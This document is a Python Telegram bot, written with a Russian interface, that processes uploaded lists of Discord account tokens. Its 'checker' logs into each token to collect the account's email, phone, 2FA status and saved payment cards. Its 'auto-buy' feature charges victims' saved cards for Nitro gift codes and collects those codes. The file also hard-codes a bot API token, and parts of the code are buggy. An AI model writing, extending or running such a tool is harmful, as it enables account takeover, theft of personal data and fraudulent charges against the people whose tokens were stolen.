from tcp_latency import measure_latency
import telebot
import requests
import sqlite3
import random
import shutil
import time
import os

conn = sqlite3.connect('db.db', check_same_thread=False)
sql = conn.cursor()

sql.execute('CREATE TABLE IF NOT EXISTS users(id BIGINT, access TEXT, nitro_type TEXT, nitro_duration TEXT, proxy TEXT)')
conn.commit()

bot = telebot.TeleBot('5652760583:AAGecMWTTHjqEm3STpLP2lwU97vgNx-pgcI', parse_mode='Markdown')

badges = {
	1: 'Discord Employee',
	2: 'Partnered Server Owner',
	4: 'HypeSquad Events',
	8: 'Bug Hunter Level 1',
	64: 'House Bravery',
	128: 'House Brilliance',
	256: 'House Balance',
	512: 'Early Supporter',
	16384: 'Bug Hunter Level 2',
	131072: 'Early Verified Bot Developer'
}

def main_markup():
	markup = telebot.types.ReplyKeyboardMarkup()
	markup.resize_keyboard = True
	markup.row_size = 2 

	markup.add(telebot.types.KeyboardButton("💞 Меню"))
	markup.add(telebot.types.KeyboardButton("🖥 Мой профиль"),
				telebot.types.KeyboardButton("ℹ️ Информация"))

	return markup

def cancel_markup():
	markup = telebot.types.ReplyKeyboardMarkup()
	markup.resize_keyboard = True
	markup.row_size = 2 

	markup.add(telebot.types.KeyboardButton("❌ Отменить"))

	return markup

def menu_markup():
	markup = telebot.types.InlineKeyboardMarkup()
	markup.row_size = 2 

	markup.add(telebot.types.InlineKeyboardButton("🔁 Чекер", callback_data="checker"))
	markup.add(telebot.types.InlineKeyboardButton("❔", callback_data="commingsoon"),#📢 Флудер
				telebot.types.InlineKeyboardButton("❔", callback_data="commingsoon"))#👤 Инвайтер
	markup.add(telebot.types.InlineKeyboardButton("👛 Авто-покупка Nitro", callback_data="autonitrobuy"))
	markup.add(telebot.types.InlineKeyboardButton("🥸 Прокси", callback_data="proxy"),
				telebot.types.InlineKeyboardButton("🛠 Настройки", callback_data="settings"))

	return markup

def proxy_markup():
	markup = telebot.types.InlineKeyboardMarkup()
	markup.row_size = 2 

	markup.add(telebot.types.InlineKeyboardButton("✏️ Изменить прокси", callback_data="changeproxy"))
	markup.add(telebot.types.InlineKeyboardButton("🔙 Назад", callback_data="back"))

	return markup

def settings_markup():
	markup = telebot.types.InlineKeyboardMarkup()
	markup.row_size = 2 

	markup.add(telebot.types.InlineKeyboardButton("👛 Авто-покупка Nitro", callback_data="autonitrobuysettings"))
	markup.add(telebot.types.InlineKeyboardButton("🔙 Назад", callback_data="back"))

	return markup

def autonitrobuysettings_markup(chat_id):
	sql.execute('SELECT * FROM users WHERE id=?', (chat_id, ))
	info = sql.fetchone()

	markup = telebot.types.InlineKeyboardMarkup()
	markup.row_size = 2 

	markup.add(telebot.types.InlineKeyboardButton("🧿 Подписка", callback_data="nope"))
	markup.add(telebot.types.InlineKeyboardButton(f"{'✅' if info[2] == 'classic' else '❌'} Классик", callback_data="nitroclassic"), telebot.types.InlineKeyboardButton(f"{'✅' if info[2] == 'boost' else '❌'} Boost", callback_data="nitroboost"))
	markup.add(telebot.types.InlineKeyboardButton("🕰 Время подписки", callback_data="nope"))
	markup.add(telebot.types.InlineKeyboardButton(f"{'✅' if info[3] == 'mounth' else '❌'} Месяц", callback_data="nitromounth"), telebot.types.InlineKeyboardButton(f"{'✅' if info[3] == 'year' else '❌'} Год", callback_data="nitroyear"))
	markup.add(telebot.types.InlineKeyboardButton("🔙 Назад", callback_data="back"))

	return markup

def profile_markup():
	markup = telebot.types.InlineKeyboardMarkup()
	markup.row_size = 2 

	markup.add(telebot.types.InlineKeyboardButton("💼 Доступ", callback_data="access"))

	return markup

def information_markup():
	markup = telebot.types.InlineKeyboardMarkup()

	markup.add(telebot.types.InlineKeyboardButton("👨‍💻 Кодер", url="https://t.me/coder_pyua"))
	markup.add(telebot.types.InlineKeyboardButton("🫅 Владелец", url="https://t.me/coder_pyua"))

	return markup

@bot.message_handler(commands=['start'])
def start_command(message):
	sql.execute('SELECT * FROM users WHERE id=?', (message.from_user.id, ))
	if not sql.fetchone():
		sql.execute('INSERT INTO users VALUES (?,?,?,?,?)', (message.from_user.id, '0', 'classic', 'mounth', 'n'))
		conn.commit()

	bot.send_message(message.from_user.id, '🖖 *Привет, я бот который помогу тебе с токенамы!*\n\n'
											'*DiscoTools — удобный комбайн ваших токенов прямо в Телеграмме!*\n'
											'*Я буду служить тебе верой и правдой, и постараюсь быть полезен!*\n\n'
											'*Для продолжения, воспользуйтесь кнопками ниже* ⤵️',
											reply_markup=main_markup())

@bot.message_handler(regexp='💞 Меню')
def menu(message):
	sql.execute('SELECT * FROM users WHERE id=?', (message.from_user.id, ))
	if not sql.fetchone():
		sql.execute('INSERT INTO users VALUES (?,?,?,?,?)', (message.from_user.id, '0', 'classic', 'mounth', 'n'))
		conn.commit()

	try:
		ping = int(measure_latency(host='discord.com')[0])
	
		if ping <= 50:
			emojiping = '🟢'
		elif ping <= 100 and ping > 51:
			emojiping = '🟡'
		elif ping <= 301 and ping > 101:
			emojiping = '🟠'
		elif ping >= 301:
			emojiping = '🔴'
	
		ping = f'{ping} ms'
	except:
		emojiping = '❔'
		ping = '❔'

	bot.send_sticker(message.from_user.id, 'CAACAgEAAxkBAAEF4UJjKKoI2XB765OJ_iwVmYoyLt9JiAACAwkAAuN4BAABpjXNpeoaPeIpBA',
											reply_markup=main_markup())

	bot.send_message(message.from_user.id, '*💞 Меню*\n\n'
											f'🌐 *Статус соединения:* `{emojiping}`\n'
											f'⏱ *Время отклика:* `{ping}`',
											reply_markup=menu_markup())

@bot.message_handler(regexp='🖥 Мой профиль')
def myprofile(message):
	sql.execute('SELECT * FROM users WHERE id=?', (message.from_user.id, ))
	info = sql.fetchone()
	if not info:
		sql.execute('INSERT INTO users VALUES (?,?,?,?,?)', (message.from_user.id, '0', 'classic', 'mounth', 'n'))
		conn.commit()

		sql.execute('SELECT * FROM users WHERE id=?', (message.from_user.id, ))
	
	bot.send_message(message.from_user.id, '*🖥 Мой профиль*\n\n'
											f'*Telegram ID:* `{message.from_user.id}`\n'
											f'*Подписка:* `{"✅" if int(info[1]) < time.time() else "❌"}`\n',
											reply_markup=profile_markup())

@bot.message_handler(regexp='ℹ️ Информация')
def information(message):
	sql.execute('SELECT * FROM users WHERE id=?', (message.from_user.id, ))
	if not sql.fetchone():
		sql.execute('INSERT INTO users VALUES (?,?,?,?,?)', (message.from_user.id, '0', 'classic', 'mounth', 'n'))
		conn.commit()
	
	bot.send_message(message.from_user.id, '*ℹ️ Информация*',
											reply_markup=information_markup())

@bot.callback_query_handler(func=lambda call: call.data == 'checker')
def checker(call):
	sql.execute('SELECT * FROM users WHERE id=?', (call.from_user.id, ))
	info = sql.fetchone()
	if int(info[1]) < time.time():
		msg = bot.send_message(call.from_user.id, '📃 *Отправьте .txt файл с токенами на проверку.*\n'
													'*Обязательно токены в текстовом формате!*',
													reply_markup=cancel_markup())
		bot.register_next_step_handler(msg, checker2)

def checker2(message):
	if message.content_type == 'document' and message.document.file_name.endswith('.txt'):
		file_info = bot.get_file(message.document.file_id)
		downloaded_file = bot.download_file(file_info.file_path)

		indef = random.randint(111111, 999999)
		open(f'results/{indef}.txt', 'wb').write(downloaded_file)
		os.mkdir(f'results/{message.from_user.id}')

		proxies = None
		sql.execute('SELECT * FROM users WHERE id=?', (message.from_user.id, ))
		info = sql.fetchone()
		if info[4] != 'n':
			proxies = {'http': info[4], 'https': info[4]}

		nitro = 0
		payments = 0
		valid = 0

		start_check = time.time()
		for token in open(f'results/{indef}.txt', 'r').read().strip().splitlines():
			try:
				r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}, proxies=proxies)
				if r.status_code == 200:
					valid += 1
					data = r.json()

					if data['nsfw_allowed']:
						nitro += 1

					r = requests.get('https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers={'Authorization': token}, proxies=proxies)
					cards = r.json()
					if len(cards) > 0:
						payments += 1

					first_name = data['username'] + "#" + data['discriminator']
					nitro = " [nitro]" if data['nsfw_allowed'] else "default"
					name_file = f'./results/{message.from_user.id}/[{first_name}] [{len(cards) if len(cards) > 0 else "no"} cards]{nitro}.txt'

					with open(file=name_file, mode="w+") as file:
						file.write(f"Username: {first_name}\n"
								   f"Email: {data['email']}\n"
								   f"Phone: {data['phone']}\n"
								   f"2FA: {data['mfa_enabled']}\n"
								   f"Verified: {data['verified']}\n"
								   f"Nitro: {nitro}\n"
								   f"Cards: {len(cards)}\n"
								   f"Servers....\n"
								   f"Badge: {badges.get(data['public_flags'])}"
								   )
			except:
				pass

		end_check = time.time()
		os.remove(f'results/{indef}.txt')

		shutil.make_archive(f'results/{message.from_user.id}', 'zip', f'results/{message.from_user.id}')
		shutil.rmtree(f'results/{message.from_user.id}')

		time_check = end_check - start_check
		bot.send_document(message.from_user.id, open(f'results/{message.from_user.id}.zip','rb'), caption='📜 *Результаты проверки:*\n\n'
																											f'✅ *Валидных:* `{valid}`\n'
																											f'💎 *С нитро:* `{nitro}\n`'
																											f'💳 *С платёгами:* `{payments}`\n\n'
																											f'⏱ *Время проверки:* `{time_check:.2f} сек.`\n\n'
																											'*Все токены были собраны в архив* ⤴️',
																											reply_markup=main_markup())
		os.remove(f'results/{message.from_user.id}.zip')

	elif message.text == '❌ Отменить':
		menu(message)
	else:
		bot.send_message(message.from_user.id, '*Ты отправил не .txt файл!*')
		menu(message)

@bot.callback_query_handler(func=lambda call: call.data == 'autonitrobuy')
def autonitrobuy(call):
	sql.execute('SELECT * FROM users WHERE id=?', (call.from_user.id, ))
	info = sql.fetchone()
	if int(info[1]) < time.time():
		msg = bot.send_message(call.from_user.id, '📃 *Отправьте .txt файл с токенами на покупку.*\n'
													'*Обязательно токены в текстовом формате!*',
													reply_markup=cancel_markup())
		bot.register_next_step_handler(msg, autonitrobuy2)

def autonitrobuy2(message):
	if message.content_type == 'document' and message.document.file_name.endswith('.txt'):
		file_info = bot.get_file(message.document.file_id)
		downloaded_file = bot.download_file(file_info.file_path)

		indef = random.randint(111111, 999999)
		open(f'results/{indef}.txt', 'wb').write(downloaded_file)
		os.mkdir(f'results/{message.from_user.id}')

		proxies = None
		sql.execute('SELECT * FROM users WHERE id=?', (message.from_user.id, ))
		if sql.fetchone()[4] != 'n':
			proxies = {'http': sql.fetchone()[4], 'https': sql.fetchone()[4]}

		if sql.fetchone()[2] == 'classic':
			nitro_id = '521846918637420545'
			nitro_type = 'classic'
			if sql.fetchone()[3] == 'mounth':
				sku_id = '511651871736201216'
				nitro_amount = '499'
				nitro_duration = 'mounth'
			elif sql.fetchone()[3] == 'year':
				sku_id = '511651876987469824'
				nitro_amount = '4999'
				nitro_duration = 'year'
		elif sql.fetchone()[2] == 'boost':
			nitro_id = '521847234246082599'
			nitro_type = 'classic'
			if sql.fetchone()[3] == 'mounth':
				sku_id = '511651880837840896'
				nitro_amount = '999'
				nitro_duration = 'mounth'
			elif sql.fetchone()[3] == 'year':
				sku_id = '511651885459963904'
				nitro_amount = '9999'
				nitro_duration = 'year'
		
		nopayments = 0
		buyed = 0

		start_buy = time.time()
		for token in open(f'results/{indef}.txt', 'r').read().strip().splitlines():
			try:
				r = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers={'Authorization': token}, proxies=proxies)
				if r.json() != []:
					data = r.json()

					for source in data:
						if not source['invalid']:
							r = requests.post(f"https://discord.com/api/v9/store/skus/{nitro_id}/purchase", json={"gift": True, "sku_subscription_plan_id": sku_id, "payment_source_id": source['id'], "payment_source_token": None, "expected_amount": nitro_amount, "expected_currency": "usd", "purchase_token": "500fb34b-671a-4614-a72e-9d13becc2e95"}, proxies=proxies)
							nitro = r.json()
							if nitro['gift_code']:
								buyed += 1
								open(f'results/{message.from_user.id}/buyed_nitro.txt', 'a+').write(f'https://discord.gift/{nitro["gift_code"]} | Plan: {nitro_type.capitalize()} | Duration: {nitro_duration.capitalize()}\n')
				else:
					nopayments += 1
			except:
				pass

		end_buy = time.time()
		os.remove(f'results/{indef}.txt')

		shutil.make_archive(f'results/{message.from_user.id}', 'zip', f'results/{message.from_user.id}')
		shutil.rmtree(f'results/{message.from_user.id}')

		time_buy = end_buy - start_buy
		bot.send_document(message.from_user.id, open(f'results/{message.from_user.id}.zip','rb'), caption='👛 *Результаты покупок:*\n\n'
																											f'✅ *Куплено:* `{buyed}`\n'
																											f'❌ *Нет платёг:* `{nopayments}`\n\n'
																											f'⏱ *Время покупок:* `{time_buy:.2f} сек.`\n\n'
																											'*Все нитро были собраны в архив* ⤴️',
																											reply_markup=main_markup())
		os.remove(f'results/{message.from_user.id}.zip')

	elif message.text == '❌ Отменить':
		menu(message)
	else:
		bot.send_message(message.from_user.id, '*Ты отправил не .txt файл!*')
		menu(message)

@bot.callback_query_handler(func=lambda call: call.data == 'proxy')
def proxy(call):
	sql.execute('SELECT * FROM users WHERE id=?', (call.from_user.id, ))
	info = sql.fetchone()
	if int(info[1]) < time.time():
		bot.edit_message_text('🥸 *Прокси*\n\n'
								f'*Текущий прокси:* `{info[4]}`',
								call.message.chat.id,
								call.message.message_id,
								reply_markup=proxy_markup())

@bot.callback_query_handler(func=lambda call: call.data == 'settings')
def settings(call):
	sql.execute('SELECT * FROM users WHERE id=?', (call.from_user.id, ))
	info = sql.fetchone()
	if int(info[1]) < time.time():
		bot.edit_message_text('🛠 *Настройки*\n\n'
								'*Выберите что нужно настроить:*',
								call.message.chat.id,
								call.message.message_id,
								reply_markup=settings_markup())

@bot.callback_query_handler(func=lambda call: call.data == 'autonitrobuysettings')
def autonitrobuysettings(call):
	sql.execute('SELECT * FROM users WHERE id=?', (call.from_user.id, ))
	info = sql.fetchone()
	if int(info[1]) < time.time():
		bot.edit_message_text('👛 *Авто-покупка Nitro*\n\n'
								'*Выберите что нужно настроить:*',
								call.message.chat.id,
								call.message.message_id,
								reply_markup=autonitrobuysettings_markup(call.from_user.id))

@bot.callback_query_handler(func=lambda call: call.data == 'nitroclassic')
def nitroclassic(call):
	sql.execute('SELECT * FROM users WHERE id=?', (call.from_user.id, ))
	info = sql.fetchone()
	if int(info[1]) < time.time():
		sql.execute('UPDATE users SET nitro_type = ? WHERE id = ?', ('classic', call.from_user.id,))
		conn.commit()

		bot.edit_message_text('👛 *Авто-покупка Nitro*\n\n'
								'*Выберите что нужно настроить:*',
								call.message.chat.id,
								call.message.message_id,
								reply_markup=autonitrobuysettings_markup(call.from_user.id))

@bot.callback_query_handler(func=lambda call: call.data == 'nitroboost')
def nitroclassic(call):
	sql.execute('SELECT * FROM users WHERE id=?', (call.from_user.id, ))
	info = sql.fetchone()
	if int(info[1]) < time.time():
		sql.execute('UPDATE users SET nitro_type = ? WHERE id = ?', ('boost', call.from_user.id,))
		conn.commit()
		
		bot.edit_message_text('👛 *Авто-покупка Nitro*\n\n'
								'*Выберите что нужно настроить:*',
								call.message.chat.id,
								call.message.message_id,
								reply_markup=autonitrobuysettings_markup(call.from_user.id))

@bot.callback_query_handler(func=lambda call: call.data == 'nitromounth')
def nitroclassic(call):
	sql.execute('SELECT * FROM users WHERE id=?', (call.from_user.id, ))
	info = sql.fetchone()
	if int(info[1]) < time.time():
		sql.execute('UPDATE users SET nitro_duration = ? WHERE id = ?', ('mounth', call.from_user.id,))
		conn.commit()
		
		bot.edit_message_text('👛 *Авто-покупка Nitro*\n\n'
								'*Выберите что нужно настроить:*',
								call.message.chat.id,
								call.message.message_id,
								reply_markup=autonitrobuysettings_markup(call.from_user.id))

@bot.callback_query_handler(func=lambda call: call.data == 'nitroyear')
def nitroclassic(call):
	sql.execute('SELECT * FROM users WHERE id=?', (call.from_user.id, ))
	info = sql.fetchone()
	if int(info[1]) < time.time():
		sql.execute('UPDATE users SET nitro_duration = ? WHERE id = ?', ('year', call.from_user.id,))
		conn.commit()
		
		bot.edit_message_text('👛 *Авто-покупка Nitro*\n\n'
								'*Выберите что нужно настроить:*',
								call.message.chat.id,
								call.message.message_id,
								reply_markup=autonitrobuysettings_markup(call.from_user.id))

@bot.callback_query_handler(func=lambda call: call.data == 'changeproxy')
def changeproxy(call):
	sql.execute('SELECT * FROM users WHERE id=?', (call.from_user.id, ))
	info = sql.fetchone()
	if int(info[1]) < time.time():
		msg = bot.send_message('*Введите новый прокси (http/s):*\n\n'
								'📝 *Формат:* `http://user:pass@100.255.3.52:6666`',
								reply_markup=cancel_markup())
		bot.register_next_step_handler(msg, changeproxy2)

def changeproxy2(message):
	if message.text == '❌ Отменить':
		menu(message)
	else:
		try:
			proxies = {'http': message.text, 'https': message.text}
			r = requests.get('https://discord.com', proxies=proxies)

			sql.execute('UPDATE users SET PROXY = ? WHERE id = ?', (message.text, call.from_user.id,))
			conn.commit()
			bot.send_message(message.from_user.id, '*Прокси обновлен!*')
			menu(message)
		except:
			bot.send_message(message.from_user.id, '*Прокси не рабочий!*')

@bot.callback_query_handler(func=lambda call: call.data == 'back')
def back(call):
	sql.execute('SELECT * FROM users WHERE id=?', (call.from_user.id, ))
	if not sql.fetchone():
		sql.execute('INSERT INTO users VALUES (?,?,?,?,?)', (call.from_user.id, '0', 'classic', 'mounth', 'n'))
		conn.commit()

	try:
		ping = int(measure_latency(host='discord.com')[0])
	
		if ping <= 50:
			emojiping = '🟢'
		elif ping <= 100:
			emojiping = '🟡'
		elif ping >= 101:
			emojiping = '🟠'
		elif ping >= 301:
			emojiping = '🔴'
	
		ping = f'{ping} ms'
	except:
		emojiping = '❔'
		ping = '❔'

	bot.edit_message_text('*💞 Меню*\n\n'
							f'🌐 *Статус соединения:* `{emojiping}`\n'
							f'⏱ *Время отклика:* `{ping}`',
							call.message.chat.id,
							call.message.message_id,
							reply_markup=menu_markup())

if __name__ == '__main__':
	while True:
		try:
			bot.polling(none_stop=True)
		except Exception as e:
			print(e)
